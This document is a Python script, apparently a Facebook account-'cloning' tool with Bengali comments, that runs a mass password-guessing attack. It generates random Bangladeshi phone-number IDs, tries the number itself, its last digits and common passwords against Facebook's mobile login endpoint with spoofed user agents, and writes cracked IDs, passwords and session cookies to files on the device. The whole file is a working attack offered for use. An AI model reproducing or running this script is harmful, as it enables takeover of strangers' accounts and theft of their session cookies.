import os, time, sys, uuid, random, requests

# ANSI কালার কোড (সুন্দর দেখানোর জন্য)
R = '\033[1;31m' # Red
G = '\033[1;32m' # Green
Y = '\033[1;33m' # Yellow
B = '\033[1;34m' # Blue
P = '\033[1;35m' # Purple
W = '\033[1;37m' # White

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{Y}     ██ ████ ██  █████       ██    ███████ 
{B}     ██  ██  ██  ██          ██    ██   ██ 
{P}     ██      ██  ███████     ██    ██   ██ 
    {W}×××××××××××××××××××××××××××××××××××××××××××××××××
    {G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |
    {G}| [✓] TOOL STATUS  : REAL CLONING (META)       |
    {G}| [✓] METHOD       : RESPONSE LOGIC (MAX)      |
    {W}×××××××××××××××××××××××××××××××××××××××××××××××××""")

def main():
    banner()
    print(f'{G}[1] START RANDOM CLONING (REAL)')
    print(f'[0] EXIT')
    print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××')
    
    choose = input(f'{R}[▼] {G}CHOOSE : {W}')
    if choose == '1':
        cloning_start()
    elif choose == '0':
        sys.exit()
    else:
        main()

def cloning_start():
    banner()
    print(f'{R}[•] {G}BD CODE: 016, 017, 018, 019{W}')
    code = input(f'{G}[+] ENTER SIM CODE: {W}')
    
    print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input(f'{G}[•] PUT CLONING LIMIT (MAX 50000): {W}'))
    
    banner()
    print(f'{G}[+] TARGET DOMAIN: RANDOM CLONING')
    print(f'[+] TOTAL IDS    : {limit}')
    print(f'[+] STATUS       : {G}RUNNING (REAL LOGIC){W}')
    print(f'[+] AIRPLANE MODE: EVERY 1000 IDS')
    print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××\n')

    ok = 0
    cp = 0
    
    for i in range(limit):
        loop = i + 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        # ৬ সংখ্যার পাসওয়ার্ড এবং ফুল নম্বর পাসওয়ার্ড ট্রাই করবে
        pws = [uid, uid[6:], 'bangladesh', '572737', '708090']

        for pw in pws:
            # শক্তিশালী ও ডাইনামিক ইউজার এজেন্ট
            ua = f"Mozilla/5.0 (Linux; Android {random.randint(8,13)}; SM-G{random.randint(900,999)}F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,123)}.0.0.0 Mobile Safari/537.36"
            
            headers = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://m.facebook.com',
                'referer': 'https://m.facebook.com/login/?ref=dbl&fl',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="120"',
                'user-agent': ua,
            }

            data = {
                'lsd': uuid.uuid4().hex,
                'jazoest': '2' + str(random.randint(1000, 9999)),
                'email': uid,
                'pass': pw,
                'login': 'Log In'
            }

            url = "https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100"
            
            sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()

            try:
                # আসল রেসপন্স চেক করা হচ্ছে
                res = requests.post(url, headers=headers, data=data, allow_redirects=False, timeout=15)
                
                if "c_user" in res.cookies.get_dict():
                    ok += 1
                    cookie = ";".join([f"{k}={v}" for k, v in res.cookies.get_dict().items()])
                    print(f'\n{G}[MALEK-OK💚] {uid} | {pw}') 
                    print(f'{G}[🌺] COOKIE = {cookie}\n')
                    with open('/sdcard/META-OK.txt', 'a') as f:
                        f.write(f'{uid}|{pw}|{cookie}\n')
                    break # পাসওয়ার্ড মিলে গেলে পরের আইডিতে যাবে
                
                elif "checkpoint" in res.cookies.get_dict():
                    cp += 1
                    print(f'\n{Y}[MALEK-CP💛] {uid} | {pw}')
                    with open('/sdcard/META-CP.txt', 'a') as f:
                        f.write(f'{uid}|{pw}\n')
                    break
            except:
                time.sleep(1) # নেটওয়ার্ক এরর হলে একটু অপেক্ষা

    print(f'\n{W}×××××××××××××××××××××××××××××××××××××××××××××××××')
    print(f'{G}[+] PROCESS COMPLETED. RESULTS SAVED IN SDCARD.')
    print(f'{W}×××××××××××××××××××××××××××××××××××××××××××××××××')

if __name__ == "__main__":
    main()
